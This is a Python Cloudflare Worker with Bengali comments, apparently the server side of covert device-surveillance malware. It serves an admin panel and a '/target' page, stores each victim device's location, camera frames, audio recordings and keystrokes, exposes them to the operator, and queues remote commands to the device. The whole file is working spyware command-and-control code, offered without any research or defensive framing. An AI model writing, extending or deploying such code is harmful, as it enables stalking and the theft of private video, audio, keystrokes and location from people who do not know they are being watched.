from workers import WorkerEntrypoint, Response
from pathlib import Path
from urllib.parse import urlparse
import json
import time


class Default(WorkerEntrypoint):
    async def fetch(self, request, env):
        url = urlparse(request.url)
        path = url.path.rstrip("/") or "/"

        cors_headers = {
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type",
        }

        if request.method == "OPTIONS":
            return Response("", headers=cors_headers)

        # ---------- ১. ডেটা রিসিভ ----------
        if path == "/api/update" and request.method == "POST":
            try:
                data = await request.json()
                client_id = data.get("id")
                if not client_id or client_id == "unknown_device":
                    return self._json({"error": "missing id"}, 400, cors_headers)

                now = time.time()

                # নিশ্চিত করা ডিভাইস আগে থেকে আছে
                existing = await env.DB.prepare(
                    "SELECT id FROM devices WHERE id = ?"
                ).bind(client_id).first()

                if not existing:
                    # নতুন ডিভাইস — সব কলাম সহ INSERT
                    await env.DB.prepare(
                        """INSERT INTO devices
                        (id, lat, lng, accuracy, device, browser, battery, charging,
                         lastSeen, lastPing, video_frame, video_time, audio_data, audio_time, keystrokes)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"""
                    ).bind(
                        client_id,
                        data.get("lat"),
                        data.get("lng"),
                        data.get("accuracy", 0),
                        data.get("device", "Unknown"),
                        data.get("browser", "Unknown"),
                        data.get("battery", "N/A"),
                        data.get("charging", "N/A"),
                        data.get("time", ""),
                        now,
                        data.get("video_frame"),
                        data.get("video_time"),
                        data.get("audio_data"),
                        data.get("audio_time"),
                        data.get("keystrokes"),
                    ).run()
                else:
                    # আপডেট — যেটা এসেছে শুধু সেটাই আপডেট
                    if "video_frame" in data:
                        await env.DB.prepare(
                            "UPDATE devices SET video_frame = ?, video_time = ?, lastPing = ? WHERE id = ?"
                        ).bind(data["video_frame"], data.get("time", ""), now, client_id).run()
                    elif "audio_data" in data:
                        await env.DB.prepare(
                            "UPDATE devices SET audio_data = ?, audio_time = ?, lastPing = ? WHERE id = ?"
                        ).bind(data["audio_data"], data.get("time", ""), now, client_id).run()
                    elif "keystrokes" in data:
                        await env.DB.prepare(
                            "UPDATE devices SET keystrokes = ?, lastPing = ? WHERE id = ?"
                        ).bind(data["keystrokes"], now, client_id).run()
                    else:
                        await env.DB.prepare(
                            """UPDATE devices SET lat=?, lng=?, accuracy=?, device=?, browser=?,
                               battery=?, charging=?, lastSeen=?, lastPing=? WHERE id=?"""
                        ).bind(
                            data.get("lat"),
                            data.get("lng"),
                            data.get("accuracy", 0),
                            data.get("device", "Unknown"),
                            data.get("browser", "Unknown"),
                            data.get("battery", "N/A"),
                            data.get("charging", "N/A"),
                            data.get("time", ""),
                            now,
                            client_id,
                        ).run()

                return self._json({"status": "success"}, 200, cors_headers)
            except Exception as e:
                return self._json({"error": str(e)}, 400, cors_headers)

        # ---------- ২. ডিভাইস লিস্ট (ভিডিও/অডিও ছাড়া, হালকা) ----------
        if path == "/api/clients" and request.method == "GET":
            try:
                result = await env.DB.prepare(
                    """SELECT id, lat, lng, accuracy, device, browser, battery, charging,
                              lastSeen, lastPing, command, video_time, audio_time, keystrokes
                       FROM devices"""
                ).all()
                clients = {row["id"]: dict(row) for row in result.results}
                return self._json(clients, 200, cors_headers)
            except Exception as e:
                return self._json({"error": str(e)}, 500, cors_headers)

        # ---------- ৩. শুধু ভিডিও ফ্রেম ----------
        if path == "/api/video" and request.method == "GET":
            try:
                from urllib.parse import parse_qs
                qs = parse_qs(url.query)
                cid = qs.get("id", [None])[0]
                if not cid:
                    return self._json({"error": "missing id"}, 400, cors_headers)
                row = await env.DB.prepare(
                    "SELECT video_frame, video_time FROM devices WHERE id = ?"
                ).bind(cid).first()
                return self._json(row or {}, 200, cors_headers)
            except Exception as e:
                return self._json({"error": str(e)}, 500, cors_headers)

        # ---------- ৪. শুধু অডিও ----------
        if path == "/api/audio" and request.method == "GET":
            try:
                from urllib.parse import parse_qs
                qs = parse_qs(url.query)
                cid = qs.get("id", [None])[0]
                if not cid:
                    return self._json({"error": "missing id"}, 400, cors_headers)
                row = await env.DB.prepare(
                    "SELECT audio_data, audio_time FROM devices WHERE id = ?"
                ).bind(cid).first()
                return self._json(row or {}, 200, cors_headers)
            except Exception as e:
                return self._json({"error": str(e)}, 500, cors_headers)

        # ---------- ৫. কমান্ড পাঠানো ----------
        if path == "/api/command" and request.method == "POST":
            try:
                data = await request.json()
                client_id = data.get("client_id")
                command = data.get("command")
                if not client_id:
                    return self._json({"error": "missing client_id"}, 400, cors_headers)
                await env.DB.prepare(
                    "UPDATE devices SET command = ? WHERE id = ?"
                ).bind(command, client_id).run()
                return self._json({"status": "success"}, 200, cors_headers)
            except Exception as e:
                return self._json({"error": str(e)}, 400, cors_headers)

        # ---------- ৬. HTML সার্ভ ----------
        if path == "/":
            return Response(self.read_file("admin.html"),
                            headers={"Content-Type": "text/html; charset=utf-8"})
        if path == "/target":
            return Response(self.read_file("target.html"),
                            headers={"Content-Type": "text/html; charset=utf-8"})
        if path == "/manifest.json":
            return Response(self.read_file("manifest.json"),
                            headers={"Content-Type": "application/manifest+json"})
        if path == "/service-worker.js":
            return Response(self.read_file("service-worker.js"),
                            headers={"Content-Type": "application/javascript"})

        return Response("Not Found", status=404)

    # ---------- হেল্পার ----------
    def _json(self, obj, status, cors):
        return Response(
            json.dumps(obj),
            status=status,
            headers={**cors, "Content-Type": "application/json"},
        )

    def read_file(self, filename):
        file_path = Path(__file__).parent / "templates" / filename
        try:
            return file_path.read_text(encoding="utf-8")
        except Exception as e:
            return f"<h1>Error reading file: {str(e)}</h1>"
